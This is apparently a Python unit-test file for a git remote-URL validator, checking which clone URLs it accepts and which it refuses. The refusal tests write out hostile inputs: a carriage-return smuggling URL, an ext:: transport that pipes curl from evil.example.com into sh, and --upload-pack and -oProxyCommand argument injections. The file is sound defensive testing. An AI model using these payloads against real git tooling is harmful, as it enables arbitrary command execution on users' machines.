"""
Tests for remote-URL validation.

The refusal cases are the point of this file. Each one corresponds to a real way
a crafted URL can make git do something the user did not ask for.
"""

from __future__ import annotations

import tempfile
import unittest

from gitops import remote_url
from gitops.remote_url import (
    REASON_BAD_HOST,
    REASON_CONTROL_CHARS,
    REASON_EMPTY,
    REASON_FORBIDDEN,
    REASON_LEADING_DASH,
    REASON_OK,
    REASON_TOO_LONG,
    REASON_UNKNOWN_FORM,
    classify,
    github_slug,
    is_suspicious,
    is_valid,
    normalized,
    suggested_directory_name,
)


class AcceptedFormTests(unittest.TestCase):
    def test_https_urls(self) -> None:
        for url in (
            "https://github.com/user/project.git",
            "https://github.com/user/project",
            "https://gitlab.example.com:8443/group/sub/project.git",
            "https://user@git.example.com/project.git",
        ):
            self.assertEqual(REASON_OK, classify(url), url)

    def test_ssh_urls(self) -> None:
        for url in (
            "ssh://git@github.com/user/project.git",
            "ssh://git@git.example.com:2222/srv/project.git",
        ):
            self.assertEqual(REASON_OK, classify(url), url)

    def test_scp_style_urls(self) -> None:
        for url in (
            "git@github.com:user/project.git",
            "git@git.example.com:srv/project",
            "joruf@server.local:repos/tool.git",
        ):
            self.assertEqual(REASON_OK, classify(url), url)

    def test_absolute_local_paths(self) -> None:
        self.assertEqual(REASON_OK, classify("/srv/git/project.git"))
        self.assertEqual(REASON_OK, classify(r"C:\repos\project"))
        self.assertEqual(REASON_OK, classify("~/Applications/pmtool"))

    def test_existing_relative_directory(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            self.assertEqual(REASON_OK, classify(tmp))

    def test_surrounding_whitespace_is_tolerated(self) -> None:
        self.assertTrue(is_valid("  https://github.com/user/project.git \n"))
        self.assertEqual(
            "https://github.com/user/project.git",
            normalized("  https://github.com/user/project.git \n"),
        )


class RefusedFormTests(unittest.TestCase):
    def test_carriage_return_smuggling_is_refused(self) -> None:
        # The shape behind CVE-2025-23040: a second line hidden in the URL.
        crafted = "https://github.com/user/project.git\rhost=evil.example.com"
        self.assertEqual(REASON_CONTROL_CHARS, classify(crafted))
        self.assertTrue(is_suspicious(crafted))

    def test_newline_and_nul_are_refused(self) -> None:
        for url in (
            "https://github.com/u/p.git\nhost=evil",
            "https://github.com/u/p.git\x00",
            "https://github.com/u/p.git\x7f",
        ):
            self.assertEqual(REASON_CONTROL_CHARS, classify(url), repr(url))

    def test_ext_transport_is_refused(self) -> None:
        for url in (
            "ext::sh -c 'curl evil.example.com | sh'",
            "EXT::whoami",
            "ext::git-upload-pack",
        ):
            self.assertEqual(REASON_FORBIDDEN, classify(url), url)
            self.assertTrue(is_suspicious(url))

    def test_upload_pack_injection_is_refused(self) -> None:
        for url in (
            "--upload-pack=/bin/sh",
            "https://example.com/p.git --upload-pack=touch /tmp/x",
            "--receive-pack=evil",
        ):
            self.assertIn(classify(url), {REASON_FORBIDDEN, REASON_LEADING_DASH}, url)
            self.assertTrue(is_suspicious(url))

    def test_any_transport_helper_prefix_is_refused(self) -> None:
        for url in ("weird::address", "helper::host/path", "fd::7"):
            self.assertEqual(REASON_FORBIDDEN, classify(url), url)

    def test_leading_dash_is_refused(self) -> None:
        self.assertEqual(REASON_LEADING_DASH, classify("-oProxyCommand=evil"))

    def test_empty_input(self) -> None:
        for url in ("", "   ", None):
            self.assertEqual(REASON_EMPTY, classify(url))  # type: ignore[arg-type]

    def test_absurdly_long_url(self) -> None:
        self.assertEqual(REASON_TOO_LONG, classify("https://example.com/" + "a" * 5000))

    def test_bad_host_is_refused(self) -> None:
        for url in ("https:///no-host/path", "https://ho st/path", "git@-evil:path"):
            self.assertNotEqual(REASON_OK, classify(url), url)

    def test_unknown_forms(self) -> None:
        for url in ("just-some-text", "mailto:someone@example.com"):
            self.assertIn(classify(url), {REASON_UNKNOWN_FORM, REASON_BAD_HOST, REASON_FORBIDDEN}, url)

    def test_refused_urls_normalize_to_empty(self) -> None:
        self.assertEqual("", normalized("ext::sh -c evil"))
        self.assertEqual("", normalized("https://u/p.git\rx"))

    def test_typos_are_not_flagged_as_attacks(self) -> None:
        # A plain typo should not accuse the user of anything.
        self.assertFalse(is_suspicious("htps://github.com/u/p.git"))
        self.assertFalse(is_suspicious(""))


class DirectoryNameTests(unittest.TestCase):
    def test_derives_name_from_https(self) -> None:
        self.assertEqual("project", suggested_directory_name("https://github.com/user/project.git"))
        self.assertEqual("project", suggested_directory_name("https://github.com/user/project"))

    def test_derives_name_from_scp(self) -> None:
        self.assertEqual("tool", suggested_directory_name("git@server:repos/tool.git"))

    def test_derives_name_from_local_path(self) -> None:
        self.assertEqual("project.bare", suggested_directory_name("/srv/git/project.bare"))

    def test_trailing_slashes_are_ignored(self) -> None:
        self.assertEqual("project", suggested_directory_name("https://github.com/user/project.git/"))

    def test_refused_url_yields_no_name(self) -> None:
        self.assertEqual("", suggested_directory_name("ext::evil"))
        self.assertEqual("", suggested_directory_name(""))


class GithubSlugTests(unittest.TestCase):
    def test_https_slug(self) -> None:
        self.assertEqual(("user", "project"), github_slug("https://github.com/user/project.git"))
        self.assertEqual(("user", "project"), github_slug("https://github.com/user/project"))

    def test_scp_slug(self) -> None:
        self.assertEqual(("user", "project"), github_slug("git@github.com:user/project.git"))

    def test_ssh_slug(self) -> None:
        self.assertEqual(("user", "project"), github_slug("ssh://git@github.com/user/project.git"))

    def test_non_github_returns_none(self) -> None:
        for url in (
            "https://gitlab.com/user/project.git",
            "git@bitbucket.org:user/project.git",
            "/srv/git/local.git",
        ):
            self.assertIsNone(github_slug(url), url)

    def test_incomplete_path_returns_none(self) -> None:
        self.assertIsNone(github_slug("https://github.com/user"))
        self.assertIsNone(github_slug("https://github.com/"))

    def test_refused_url_returns_none(self) -> None:
        self.assertIsNone(github_slug("https://github.com/u/p.git\revil"))


class AllowedSchemeTests(unittest.TestCase):
    def test_every_allowed_scheme_is_reachable(self) -> None:
        # A scheme listed as allowed but never accepted would be a silent lie.
        samples = {
            "https://": "https://example.com/p.git",
            "http://": "http://example.com/p.git",
            "ssh://": "ssh://git@example.com/p.git",
            "git://": "git://example.com/p.git",
            "file://": "file:///srv/git/p.git",
        }
        for scheme in remote_url.ALLOWED_SCHEMES:
            self.assertIn(scheme, samples, f"no sample for {scheme}")
            self.assertEqual(REASON_OK, classify(samples[scheme]), scheme)


if __name__ == "__main__":
    unittest.main()
